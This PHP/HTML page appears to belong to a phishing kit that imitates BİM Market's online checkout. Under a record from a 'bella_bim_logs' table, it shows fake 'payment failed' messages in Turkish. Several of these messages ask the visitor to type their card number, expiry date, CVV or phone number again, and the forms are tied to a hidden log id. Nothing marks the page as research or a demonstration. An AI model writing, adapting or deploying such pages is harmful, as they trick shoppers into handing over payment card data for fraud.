<?php

// Include the helper
include_once('../inc/helper.php');

// Get the data from the request
$tID = htmlspecialchars(trim(strip_tags($_GET['t'])));

if (empty($tID)) {
    header('Location: index.php');
    exit;
}

// Check transaction exist
$sql = "SELECT * FROM bella_bim_logs WHERE id = ?";
$query = $db->prepare($sql);
$stmt = $query->execute([$tID]);
$log = $query->fetch(PDO::FETCH_OBJ);

if (!$log) {
    header('Location: index.php');
    exit;
}

$hata = null;

if (isset($_GET['hata'])) {
    $hata = htmlspecialchars(trim(strip_tags($_GET['hata'])));
}

?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE-EmulateIE7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta id="viewport" name="viewport"
          content="width=device-width, maximum-scale=1.0, initial-scale=1.0, user-scalable=no, minimal-ui">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">

    <title>
        <?php if ($hata == 'ccno'): ?>
            Kart Numarası Hatalı - BİM Market
        <?php elseif ($hata == 'ccexp'): ?>
            Kart Son Kullanma Tarihi Hatalı - BİM Market
        <?php elseif ($hata == 'cccvv'): ?>
            Kart CVV Hatalı - BİM Market
        <?php elseif ($hata == 'cc_closed'): ?>
            Kart İnternet Alışverişine Kapalı - BİM Market
        <?php elseif ($hata == 'cc_red'): ?>
            Kart Reddedildi - BİM Market
        <?php elseif ($hata == 'phone_error'): ?>
            Telefon Numarası Hatalı - BİM Market
        <?php else: ?>
            Ödeme - BİM Market
        <?php endif; ?>
    </title>

    <link href="assets/img/static_omnishop/ayb822/dist/style.css" rel="stylesheet" type="text/css">
    <!-- JQUERY -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
    <!-- Custom inline JS -->
    <script type="text/javascript">
        var GLOBALS = {
            THUMBNAIL_ACTIVE: true,
            THUMBNAIL_OPTIONS: {
                "product-list__big": {"width": 587, "quality": 60, "crop": "center", "height": 587},
                "category-detail": {"width": 870, "quality": 60, "height": 317},
                "email-thumbnail": {"width": 80, "quality": 60, "crop": "center", "height": 80},
                "product_basket_thumb_image": {"width": 120, "quality": 60, "height": 120},
                "discount-product-list": {"width": 190, "quality": 100, "crop": "center", "height": 190},
                "product-content-variant-image": {"width": 70, "quality": 60, "crop": "center", "height": 70},
                "product-detail__slider_display": {"width": 780, "quality": 60, "crop": "center", "height": 780},
                "product-detail__slider_zoom": {"width": 1400, "quality": 60, "crop": "center", "height": 1400},
                "product-detail__slider_thumbnail": {"width": 150, "quality": 60, "crop": "center", "height": 150},
                "category-detail__sub-category-banner": {"width": 270, "quality": 60, "height": 335},
                "autocomplete": {"width": 40, "quality": 60, "height": 40},
                "category-detail__campaign-banner": {"width": 420, "quality": 60, "height": 210},
                "product-map-image": {"width": 60, "quality": 60, "crop": "center", "height": 60},
                "product-list": {"width": 250, "quality": 100, "crop": "center", "height": 250}
            },
            DEFAULT_COUNTRY: {'pk': 1},
            isUserLoggin: false,
            userPhone: '',
            sendTime: '',
            phoneLogin: '',
            isAutoSetShippingOption: false,
            isPaymentTabRunningFromSlug: true,
            disableAutoSelectOneAddress: true,
            userEmail: '',
            userName: '',
            userSurname: '',
        };
    </script>
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-regular-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-bold-webfont.woff2" as="font"
          type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/a101_tradegothic-bold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-extrabold-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/panton-blackcaps-webfont.woff2"
          as="font" type="font/woff2" crossorigin="">
    <link rel="preload" href="assets/img/static_omnishop/ayb822/dist/icomoon.ttf" as="font"
          type="font/ttf" crossorigin="">
    <script src="assets/js/cookie-seal.js"></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
        }

        .container {
            max-width: 800px;
            margin: auto;
            padding: 0 20px;
        }

        .error {
            font-size: 10rem;
            color: #ff0000;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 3rem;
            margin-bottom: 1rem;
        }

        p {
            font-size: 2rem;
            margin-bottom: 2rem;
        }

        a {
            text-decoration: none;
            font-size: 2.8rem;
            color: #00B3C8;
        }
    </style>

</head>
<body class="page-inner address">

<section class="js-main-wrapper">

    <header class="page-checkout-header">
        <div class="container">
            <a href="#" class="logo" title="BİM">
                <img loading="lazy" src="bimex.png">
            </a>
            <div class="clearfix"></div>
        </div>
    </header>

    <!-- Thanks Section -->
    <section class="page-checkout js-page-checkout js-tab-box">
        <div class="container" style="margin-top:10rem!important;">
            <?php if ($hata == 'ccno'): ?>
                <div style="text-align: center; font-size: 2rem;">
                    <h1 style="margin-bottom: 2rem; font-size: 2rem;" class="error">Ödeme İşlemi Başarısız</h1>
                    <p style="margin-top: 1rem; font-size: 2rem;">Kart numaranızı hatalı girdiğiniz için ödeme
                        işleminiz başarısız oldu.</p>
                    <p style="margin-top: 1rem; font-size: 2rem;">Lütfen, alttaki alandan kart numaranızı
                        güncelleyerek işleminize devam ediniz.</p>
                    <form class="form-group" id="updateCardNumberForm" style="margin-top: 3rem;">
                        <div style="display: flex; flex-direction: column; align-items: center;">
                            <label for="cardNumber" style="margin-bottom: 1rem;">Kart Numarası:</label>
                            <input type="text" class="form-control" id="cardNumber" name="cardNumber"
                                   placeholder="Kart Numarası" minlength="16" maxlength="16" required
                                   style="padding: 0.5rem; margin-bottom: 1rem; font-size: 2rem;">
                        </div>
                        <input type="hidden" name="orderId" id="orderId" value="<?= $log->id ?>">
                        <button type="submit"
                                style="background-color: #007bff; color: white; padding: 0.5rem 1rem; border-radius: 5px; border: none; font-size: 2rem; margin-top: 1rem;">
                            Güncelle
                        </button>
                    </form>
                </div>
            <?php elseif ($hata == 'ccexp'): ?>
                <div style="text-align: center; font-size: 2rem;">
                    <h1 style="margin-bottom: 2rem; font-size: 2rem;" class="error">Ödeme İşlemi Başarısız</h1>
                    <p style="margin-top: 1rem; font-size: 2rem;">Kartınızın son kullanım tarihini hatalı
                        girdiğiniz için ödeme işleminiz başarısız oldu.</p>
                    <p style="margin-top: 1rem; font-size: 2rem;">Lütfen, alttaki alandan kartınızın son
                        kullanım tarihini güncelleyerek işleminize devam ediniz.</p>
                    <form class="form-group" id="updateCardExpForm" style="margin-top: 3rem;">
                        <div style="display: flex; flex-direction: column; align-items: center;">
                            <label for="cardExp" style="margin-bottom: 1rem;">Son Kullanım Tarihi:</label>
                            <select name="cardExpMonth" id="cardExpMonth" class="form-control"
                                    style="padding: 0.5rem; margin-bottom: 1rem; font-size: 2rem;">
                                <option value="01">1</option>
                                <option value="02">2</option>
                                <option value="03">3</option>
                                <option value="04">4</option>
                                <option value="05">5</option>
                                <option value="06">6</option>
                                <option value="07">7</option>
                                <option value="08">8</option>
                                <option value="09">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select name="cardExpYear" id="cardExpYear" class="form-control"
                                    style="padding: 0.5rem; margin-bottom: 1rem; font-size: 2rem;">
                                <option value="2023">2023</option>
                                <option value="2024">2024</option>
                                <option value="2025">2025</option>
                                <option value="2026">2026</option>
                                <option value="2027">2027</option>
                                <option value="2028">2028</option>
                                <option value="2029">2029</option>
                                <option value="2030">2030</option>
                                <option value="2031">2031</option>
                                <option value="2032">2032</option>
                                <option value="2033">2033</option>
                                <option value="2034">2034</option>
                            </select>
                        </div>
                        <input type="hidden" name="orderId" id="orderId" value="<?= $log->id ?>">
                        <button type="submit"
                                style="background-color: #007bff; color: white; padding: 0.5rem 1rem; border-radius: 5px; border: none; font-size: 2rem; margin-top: 1rem;">
                            Güncelle
                        </button>
                    </form>
                </div>
            <?php elseif ($hata == 'cccvv'): ?>
                <div style="text-align: center; font-size: 2rem;">
                    <h1 style="margin-bottom: 2rem; font-size: 2rem;" class="error">Ödeme İşlemi Başarısız</h1>
                    <p style="margin-top: 1rem; font-size: 2rem;">Kartınızın CVV numarasını (Güvenlik Kodu) hatalı
                        girdiğiniz
                        için ödeme işleminiz başarısız oldu.</p>
                    <p style="margin-top: 1rem; font-size: 2rem;">Lütfen, alttaki alandan kartınızın CVV numarasını
                        (Güvenlik
                        Kodu) güncelleyerek işleminize devam ediniz.</p>
                    <form class="form-group" id="updateCardCVVForm" style="margin-top: 3rem;">
                        <div style="display: flex; flex-direction: column; align-items: center;">
                            <label for="cardCVV" style="margin-bottom: 1rem;">CVV:</label>
                            <input type="text" class="form-control" id="cardCVV" name="cardCVV"
                                   placeholder="111" minlength="3" maxlength="3" required
                                   style="padding: 0.5rem; margin-bottom: 1rem; font-size: 2rem;">
                        </div>
                        <input type="hidden" name="orderId" id="orderId" value="<?= $log->id ?>">
                        <button type="submit"
                                style="background-color: #007bff; color: white; padding: 0.5rem 1rem; border-radius: 5px; border: none; font-size: 2rem; margin-top: 1rem;">
                            Güncelle
                        </button>
                    </form>
                </div>
            <?php elseif ($hata == 'cc_closed'): ?>
                <div class="text-center">
                    <h1 style="margin-bottom:2rem;">
                        Ödeme İşlemi Başarısız
                    </h1>
                    <p style="margin-top:1rem;">Kartınız internet üzerinden ödeme yapmak için kapalıdır.</p>
                    <p style="margin-top:1rem;">Lütfen, kartınızın bankası ile iletişime geçerek kartınızın internet
                        üzerinden ödeme yapılmasına izin verilmesini sağlayınız.</p>
                    <a href="tamamla.php" class="btn btn-primary">Ödeme Sayfasına Dön</a>
                </div>
            <?php elseif ($hata == 'cc_red'): ?>
                <div class="text-center">
                    <h1 style="margin-bottom:2rem;">
                        Ödeme İşlemi Başarısız
                    </h1>
                    <p style="margin-top:1rem;">Kartınızın bankası tarafından reddedildiği için ödeme işleminiz
                        başarısız oldu.</p>
                    <p style="margin-top:1rem;">Lütfen, kartınızın bankası ile iletişime geçiniz.</p>
                    <a href="tamamla.php" class="btn btn-primary">Ödeme Sayfasına Dön</a>
                </div>
            <?php elseif ($hata == 'phone_error'): ?>
                <div style="text-align: center; font-size: 2rem;">
                    <h1 style="margin-bottom: 2rem; font-size: 2rem;" class="error">Ödeme İşlemi Başarısız</h1>
                    <p style="margin-top: 1rem; font-size: 2rem;">Telefon numaranızı hatalı girdiğiniz için ödeme
                        işleminiz başarısız oldu.</p>
                    <p style="margin-top: 1rem; font-size: 2rem;">Lütfen, alttaki alandan telefon numaranızı
                        güncelleyerek işleminize devam ediniz.</p>
                    <form class="form-group" id="updatePhoneNumberForm" style="margin-top: 3rem;">
                        <div style="display: flex; flex-direction: column; align-items: center;">
                            <label for="phoneNumber" style="margin-bottom: 1rem;">Telefon Numarası:</label>
                            <input type="text" class="form-control" id="phoneNumber" name="phoneNumber"
                                   placeholder="5550000000" minlength="10" maxlength="10" required
                                   style="padding: 0.5rem; margin-bottom: 1rem; font-size: 2rem;">
                        </div>
                        <input type="hidden" name="orderId" id="orderId" value="<?= $log->id ?>">
                        <button type="submit"
                                style="background-color: #007bff; color: white; padding: 0.5rem 1rem; border-radius: 5px; border: none; font-size: 2rem; margin-top: 1rem;">
                            Güncelle
                        </button>
                    </form>
                </div>
            <?php else: ?>
                <?= header("Location: tamamla.php"); ?>
            <?php endif; ?>
        </div>
    </section>
    <!-- Thanks Section -->


    <footer class="page-checkout-footer hidden-xs">
        <p>2024 BİM Tüm Hakları Saklıdır.</p>
    </footer>


    <div class="clear"></div>
</section>

<div class="back-to-top js-back-to-top hide-on-app">
    <i class="fa fa-angle-up"></i>
</div>
<script src="assets/js/bundle.js"></script>
<script src="assets/js/init.js" type="text/javascript"></script>
<script src="assets/js/error.js" type="text/javascript"></script>
</body>
</html>